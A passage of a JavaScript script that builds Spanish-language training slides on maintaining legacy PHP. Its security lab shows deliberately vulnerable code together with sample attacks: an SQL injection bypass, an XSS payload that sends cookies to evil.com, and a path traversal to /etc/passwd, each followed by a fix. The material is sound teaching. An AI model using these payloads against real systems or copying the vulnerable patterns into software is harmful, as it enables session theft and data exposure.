  addHeader(slide, "Documentación Arqueológica", "Bloque 4 · 4.7 Sembrando para el Futuro", "Documentación");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Comentando lo indescifrable con IA",
    code: `/* 
  ARQUEOLOGÍA TÉCNICA - 20/04/2026
  Este bloque maneja el cálculo de impuestos legacy.
  NO TOCAR: El redondeo afecta la integración con el banco.
  Regla original: si el monto < 1000, no aplica tasa.
*/
if ($monto < 1000) { ... }`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

// ─── SEGURIDAD Y AUDITORÍA ───────────────────────────────────────────────────

function createSecurityHazardsChecklistSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Checklist de Peligros Legacy", "Bloque 4 · 4.8 Auditoría de Seguridad", "Seguridad");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "¿Qué buscar apenas abres un .php antiguo?", columns: 2,
    entries: [
      { badge: "SQL", title: "Concatenación SQL", body: "Busca variables PHP pegadas directamente en strings de SELECT/UPDATE.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "EVAL", title: "Uso de eval()", body: "Cualquier ejecución de strings como código es una puerta abierta total.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "FILE", title: "include/require dinámicos", body: "Carga de archivos basada en variables de URL ($_GET['page']).", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "TYPE", title: "Falta de Casting", body: "Usar IDs de URL sin asegurar que sean enteros: (int)$_GET['id'].", accent: C.gold, fill: C.white, badgeFill: C.gold },
    ]
  });
  validateSlide(slide, pptx);
}

function createSqlInjectionLabInsecureSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Lab SQLi: El Código Inseguro", "Bloque 4 · 4.8 Caso de Estudio SQLi", "Inseguro");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "buscar_usuario.php (Vulnerable)",
    code: `<?php
include('db.php');
$id = $_GET['id']; // Captura directa sin filtro

// VULNERABILIDAD: El dato entra directo a la query
$sql = "SELECT * FROM users WHERE id = " . $id;

$res = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($res);
echo "Hola: " . $user['username'];
?>`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createSqlInjectionLabExploitSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Lab SQLi: El Exploit", "Bloque 4 · 4.8 Rompiendo la lógica", "Exploit");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "Ataque por bypass de ID",
    body: "Si el atacante cambia la URL por: buscar.php?id=-1 OR 1=1 --",
    accent: C.red, fill: C.paleRed, line: C.red
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 3.82, w: 10.26, h: 2.94, title: "Resultado en el Servidor (SQL resultante)",
    code: `SELECT * FROM users WHERE id = -1 OR 1=1 --

/* 
  Explicación:
  - id = -1 (No devuelve nada)
  - OR 1=1 (Siempre es verdadero, devuelve TODA la tabla)
  - -- (Comenta el resto de la query original)
*/`,
    lang: "sql", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createSqlInjectionLabFixSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Lab SQLi: Parche Quirúrgico", "Bloque 4 · 4.8 Solución de Mínimo Impacto", "Corregido");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Parcheando sin romper el estilo del autor",
    code: `<?php
include('db.php');

// SOLUCIÓN 1: Forzar tipo entero (Casting)
$id = (int)$_GET['id']; 

// SOLUCIÓN 2: Sanitización de escape
// $id = mysqli_real_escape_string($conn, $_GET['id']);

$sql = "SELECT * FROM users WHERE id = " . $id;
// Ahora la query es segura porque $id es garantizadamente un número.
?>`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createXssLabInsecureSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Lab XSS: El Código Inseguro", "Bloque 4 · 4.9 Inyección en la Vista", "Inseguro");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "saludo.php (Vulnerable)",
    code: `<?php
$nombre = $_GET['nombre']; // "Diego"
?>
<div class="welcome">
    <!-- VULNERABILIDAD: Impresión cruda en el HTML -->
    <h1>Bienvenido, <?php echo $nombre; ?></h1>
</div>`,
    lang: "html", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createXssLabExploitSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Lab XSS: El Exploit", "Bloque 4 · 4.9 Robo de sesión", "Exploit");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "Inyección de Script Malicioso",
    body: "Atacante envía URL: saludo.php?nombre=<script>fetch('https://evil.com?c='+document.cookie)</script>",
    accent: C.red, fill: C.paleRed, line: C.red
  });
  addCenterStatement(slide, SH, "El navegador del usuario ejecutará el script, enviando sus cookies al servidor del atacante sin que se de cuenta.", {
    x: 0.88, y: 3.82, w: 10.26, h: 2.94, fill: C.white, color: C.red, fontSize: 20, bold: true
  });
  validateSlide(slide, pptx);
}

function createXssLabFixSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Lab XSS: El Estándar de Oro", "Bloque 4 · 4.9 htmlspecialchars()", "Corregido");
  addCodePanel(slide, SH, {
    x: 0.5, y: 2.22, w: 12.33, h: 4.54, title: "Escape de caracteres especiales",
    code: `<?php
$nombre = $_GET['nombre'];
?>
<div class="welcome">
    <!-- SEGURO: Convierte < en &lt; y > en &gt; -->
    <h1>Bienvenido, <?php echo htmlspecialchars($nombre, ENT_QUOTES, 'UTF-8'); ?></h1>
</div>

<!-- El navegador mostrará el código del script como texto, no lo ejecutará. -->`,
    lang: "html", fontSize: 15
  });
  validateSlide(slide, pptx);
}

function createLfiLabSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Lab LFI: Inyección de Archivos", "Bloque 4 · 4.10 Local File Inclusion", "Peligro");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.0, w: 10.26, h: 1.6, title: "Vulnerable (Insecure)",
    code: `// index.php?page=contacto
include($_GET['page'] . ".php"); // ¡Atacante puede poner ../../../etc/passwd!`,
    lang: "php", fontSize: 14
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 3.8, w: 10.26, h: 3.2, title: "Seguro (Whitelisting)",
    code: `$allowed = ['home', 'contacto', 'perfil'];
$page = $_GET['page'] ?? 'home';

if (in_array($page, $allowed)) {
    include($page . ".php");
} else {
    die("Página no permitida");
}`,
    lang: "php", fontSize: 14
  });
  validateSlide(slide, pptx);
}

function createAiSecurityAuditorSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "IA como Auditora de Código Inseguro", "Bloque 4 · Huella Metodológica", "Auditoría");
  addPromptQualityCompare(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.46,
    title: "Encontrando Agujeros en el Pasado",
    badTitle: "Prompt Débil",
    badSubtitle: "Superficial",
    badPrompt: "'¿Este código PHP es seguro?'.",
    badNotes: ["Falla en ver la conexión con la DB.", "Ignora el contexto de las sesiones.", "Da una respuesta genérica."],
    goodTitle: "Prompt de Auditoría",
    goodSubtitle: "Simulación de Ataque",
    goodPrompt: "'Actúa como un analista de seguridad. Examina este script legacy: lista puntos de SQL Injection, XSS y LFI. Sugiere correcciones quirúrgicas que mantengan la compatibilidad'.",
    goodNotes: ["Mapea ataques reales.", "Prioriza el parcheo.", "Explica el porqué del riesgo."],
    footer: "La IA lee el código 'con malicia' para que tú lo repares con maestría."
  });
  validateSlide(slide, pptx);
}

function createDefenseInDepthLegacySlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Defensa en Profundidad en el Barro", "Bloque 4 · 4.11 Capas de Protección", "Estrategia");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Protegiendo cuando no puedes refactorizar todo", columns: 2,
    entries: [
      { badge: "WAF", title: "Firewall de Aplicación", body: "Usar ModSecurity o Cloudflare para bloquear ataques conocidos antes de que lleguen al PHP.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "PHP", title: "Endurecimiento de php.ini", body: "Deshabilitar allow_url_fopen y funciones peligrosas como system/exec.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "DB", title: "Permisos Mínimos", body: "Que el usuario de la DB solo tenga permisos de SELECT/UPDATE, no de DROP o CREATE.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
      { badge: "LOG", title: "Monitoreo de Anomalías", body: "Alertar si una IP genera demasiados errores de sintaxis SQL en poco tiempo.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createTechnicalDebtEthicsSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Ética y Profesionalismo ante el Legado", "Bloque 4 · 4.7 La mentalidad del Ingeniero Senior", "Ética");
  addCenterStatement(slide, SH, "No te quejes del código que hoy sostiene tu sueldo. Tu trabajo es ser la solución, no el crítico.", {
    x: 0.88, y: 2.22, w: 10.26, h: 1.14, fill: C.navy, color: C.white, fontSize: 18, rectRadius: 0.07
  });
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 3.6, w: 10.26, h: 3.16, title: "El Decálogo del Profesional", columns: 2,
    entries: [
      { badge: "RESP", title: "Respeto al Autor", body: "No insultes el código viejo; no sabes bajo qué presión se escribió.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "VAL", title: "Valor del Negocio", body: "Si el código feo genera dinero, es código exitoso.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "HUM", title: "Humildad Técnica", body: "Saber FastAPI es fácil; saber arreglar PHP sin romperlo es difícil.", accent: C.gold, fill: C.white, badgeFill: C.gold },
      { badge: "IA", title: "IA como Aliada", body: "Usa herramientas modernas para domar tecnologías antiguas.", accent: C.gold, fill: C.white, badgeFill: C.gold },
    ]
  });
  validateSlide(slide, pptx);
}

function createQuotesDangerSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Peligro: El Infierno de las Comillas", "Bloque 4 · 4.3 Errores de sintaxis fatales", "Peligro");
  addMythRealityGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Concatenación y SQL",
    entries: [
      { badge: "ERROR", myth: "SET f='$var' (comilla simple)", reality: "Si $var tiene una comilla (o'connor), el SQL se rompe.", accent: C.red, badgeFill: C.paleRed },
      { badge: "SAFE", myth: "Uso de mysqli_real_escape_string", reality: "Limpia los datos antes de inyectarlos al SQL. Vital en legado.", accent: C.navy, badgeFill: C.softBlue },
      { badge: "ERROR", myth: "Confundir puntos y comas.", reality: "En PHP el punto une strings. Un punto mal puesto detiene el servidor.", accent: C.red, badgeFill: C.paleRed },
      { badge: "SAFE", myth: "Validación por IA.", reality: "Usa el agente para que 'lea' si tus comillas están balanceadas.", accent: C.navy, badgeFill: C.softBlue },
    ]
  });
  validateSlide(slide, pptx);
}

function createIaSurgicalConsultantSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "IA como Consultora Quirúrgica", "Bloque 4 · Huella Metodológica", "IA");
  addPromptQualityCompare(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.46,
    title: "Prompts de Mantenimiento",
    badTitle: "El Error de Novato",
    badSubtitle: "Pedir reescritura",
    badPrompt: "'Limpia este archivo editar.php para que sea mejor y más moderno'.",
    badNotes: ["Borra dependencias del sitio.", "Cambia la conexión a la DB.", "Inutiliza el sistema."],
    goodTitle: "El Enfoque Quirúrgico",
    goodSubtitle: "Intervención Focalizada",
    goodPrompt: "'Tengo este archivo editar.php. Solo quiero añadir el campo telefono. Genera el snippet para el POST, el SQL y el HTML respetando las variables actuales'.",
    goodNotes: ["Mantiene la integridad.", "Cambio mínimo y seguro.", "Fácil de auditar."],
    footer: "No busques elegancia en el legado; busca precisión y continuidad."
  });
  validateSlide(slide, pptx);
}

function createSmokeTestSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Protocolo Smoke Test", "Bloque 4 · 4.4 La prueba de fuego", "Validación");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Lista de verificación post-operación", columns: 2,
    entries: [
      { badge: "LOAD", title: "Carga de Página", body: "¿La página abre sin errores 500 o 'White Screen of Death'?", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "SAVE", title: "Persistencia Real", body: "¿Si guardas el teléfono nuevo, aparece al refrescar la página?", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "SESS", title: "Estado de Sesión", body: "¿Sigues logueado tras guardar o la sesión se cerró por error?", accent: C.red, fill: C.paleRed, badgeFill: C.red },
      { badge: "XSS", title: "Seguridad Básica", body: "¿Qué pasa si guardas un <script> en el nuevo campo?", accent: C.red, fill: C.paleRed, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createBlock4QuestionsSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.warm };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addChip(slide, SH, "PREGUNTAS GUÍA — BLOQUE 4", { x: 0.88, y: 0.44, w: 3.4, h: 0.3, fill: C.navy, color: C.white, fontSize: 10.0 });
  const questions = [
    { n: "01", text: "¿Por qué es vital respetar el estilo del autor original en una cirugía de software?" },
    { n: "02", text: "¿En qué etapa del mantenimiento quirúrgico es más útil la ayuda de un agente de IA?" },
    { n: "03", text: "¿Qué buscamos confirmar al realizar un 'Smoke Test' tras una intervención?" },
  ];
  questions.forEach((q, i) => {
    const y = 1.12 + i * 1.96;
    slide.addText(q.n, { x: 0.88, y: y + 0.04, w: 0.58, h: 0.68, fontFace: TYPOGRAPHY.display, fontSize: 38, bold: true, color: C.border, margin: 0, valign: "mid" });
    slide.addText(q.text, { x: 1.6, y, w: 8.72, h: 1.56, fontFace: TYPOGRAPHY.body, fontSize: 15.6, color: C.navy, margin: 0, valign: "mid" });
    if (i < 2) slide.addShape(SH.line, { x: 0.88, y: y + 1.72, w: 10.28, h: 0, line: { color: C.border, pt: 1 } });
  });
  validateSlide(slide, pptx);
}

function createWeeklySynthesisSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "De la Abstracción al Barro", "Síntesis Semanal · El Ingeniero Versátil", "Síntesis");
  addCenterStatement(slide, SH, "Un verdadero senior navega entre la elegancia de FastAPI y la cruda realidad del PHP Legacy.", {
    x: 0.88, y: 2.22, w: 10.26, h: 1.14, fill: C.navy, color: C.white, fontSize: 18, rectRadius: 0.07
  });
  const journey = [
    { title: "Pasado (Hoy)", body: "PHP puro, sesiones nativas y archivos mezclados.", accent: C.red },
    { title: "Presente (Ayer)", body: "APIs REST, Pydantic y tipado estricto en Python.", accent: C.navy },
    { title: "Futuro (Mañana)", body: "Arquitectura MVC para poner orden al caos.", accent: C.gold },
  ];
  journey.forEach((j, i) => {
    addMiniCard(slide, SH, {
      x: 0.88 + i * 3.44, y: 3.62, w: 3.2, h: 2.06, title: j.title, body: j.body, accent: j.accent,
      fill: C.white, line: C.border, titleFontSize: 13, bodyFontSize: 10.5
    });
  });
  validateSlide(slide, pptx);
}

function createFinalClassSynthesisSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Resumen Final de la Sesión", "Los 4 Pilares del Mantenimiento", "Cierre");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Lo que aprendimos hoy", columns: 2,
    entries: [
      { badge: "VALOR", title: "Legado como Activo", body: "El código antiguo paga sueldos; se respeta y se diagnostica.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "READ", title: "Lectura Técnica", body: "Sintaxis PHP y Superglobales ($ _GET, $ _POST) como base HTTP.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "SESS", title: "Estado Persistente", body: "Gestión de sesiones y cookies para recordar la identidad.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "ACT", title: "Cirugía de Software", body: "Intervenciones mínimas, precisas y seguras (Axioma de Integridad).", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
    ]
  });
  validateSlide(slide, pptx);
}

function createFinalClosingSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.navy };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addBarsMotif(slide, 0.88, 1.22, 1.1, C.gold);
  slide.addText("Próxima Clase:\nPatrones y MVC", {
    x: 0.88, y: 2.14, w: 9.2, h: 1.26, fontFace: TYPOGRAPHY.display, fontSize: 36, bold: true, color: C.white, valign: "mid",
  });
  slide.addText("Descubriremos cómo aplicar patrones de diseño para rescatar el código legacy, separando la lógica de negocio de la visualización para lograr sistemas escalables.", {
    x: 0.88, y: 3.62, w: 8.2, h: 0.8, fontFace: TYPOGRAPHY.body, fontSize: 15.2, color: "DCE6F2",
  });
  addCenterStatement(slide, SH, "Nos vemos el martes 21 de abril", {
    x: 0.88, y: 5.82, w: 10.26, h: 0.82, fill: C.gold, fontSize: 24, color: C.navy, bold: true
  });
  validateSlide(slide, pptx);
}

// ─── EJECUCIÓN ───────────────────────────────────────────────────────────────

function main() {
  createCoverSlide();
  createConnectionSlide();
  createEngineerProfileSlide();
  createObjectivesSlide();
  createLearningPathSlide();
  createIntegrityPrincipleSlide();

  createBlock1IntroSlide();
  createLegacyDefinitionSlide();
  createArchFilesVsResourcesSlide();
  createFolderIsApiSlide();
  createSpaghettiPatternSlide();
  createIaArchaeologistSlide();
  createExplorationStrategySlide();
  createBlock1QuestionsSlide();
  createBlock1SynthesisSlide();

  createBlock2IntroSlide();
  createSurvivalSyntax1Slide();
  createSurvivalSyntax2Slide();
  createAssociativeArraysSlide();
  createForeachSlide();
  createPhpHtmlSandwichSlide();
  createOutputTagsSlide();
  createSuperglobalsIntroSlide();
  createGetMethodSlide();
  createPostMethodSlide();
  createFormMappingSlide();
  createIssetValidationSlide();
  createIaTranslatorSlide();
  createLightningActivitySlide();
  createTypingModernSlide();
  createBlock2QuestionsSlide();
  createBlock2SynthesisSlide();

  createBlock3IntroSlide();
  createHttpStatelessSlide();
  createSessionStartSlide();
  createSessionCookieSimbiosisSlide();
  createCookieAnatomySlide();
  createSessionSyntaxSlide();
  createAuthFlowSlide();
  createRouteProtectionSlide();
  createSessionIdActionSlide();
  createSessionSecurity1Slide();
  createSessionSecurity2Slide();
  createSessionDestroySlide();
  createIaSessionAuditorSlide();
  createBlock3QuestionsSlide();
  createBlock3SynthesisSlide();

  createBlock4IntroSlide();
  createAllInOneAnatomySlide();
  createStabilitySlide();
  createSurgicalScenarioSlide();
  createPhase1InputSlide();
  createPhase2PersistenceSlide();
  createPhase3ViewSlide();

  // Expansión Bloque 4
  createMonsterFileMappingSlide();
  createProfessionalLogsSlide();
  createLegacySanitizationSlide();
  createSeamPatternSlide();
  createCharacterizationTestSlide();
  createLegacyDatesSlide();
  createLegacyEncodingSlide();
  createDocumentationArcheologySlide();
  
  // Auditoría de Seguridad
  createSecurityHazardsChecklistSlide();
  createSqlInjectionLabInsecureSlide();
  createSqlInjectionLabExploitSlide();
  createSqlInjectionLabFixSlide();
  createXssLabInsecureSlide();
  createXssLabExploitSlide();
  createXssLabFixSlide();
  createLfiLabSlide();
  createAiSecurityAuditorSlide();
  createDefenseInDepthLegacySlide();

  createTechnicalDebtEthicsSlide();

  createQuotesDangerSlide();
  createIaSurgicalConsultantSlide();
  createSmokeTestSlide();
  createBlock4QuestionsSlide();
  createWeeklySynthesisSlide();
  createFinalClassSynthesisSlide();
  createFinalClosingSlide();

  pptx
    .writeFile({ fileName: outputPptx })
    .then(() => {
      console.log(`PPTX generado: ${outputPptx}`);
      fs.copyFileSync(__filename, outputJs);
      console.log(`Fuente copiada: ${outputJs}`);
    })
    .catch((err) => {
      console.error("Error generando PPTX:", err);
      process.exit(1);
    });
}

main();
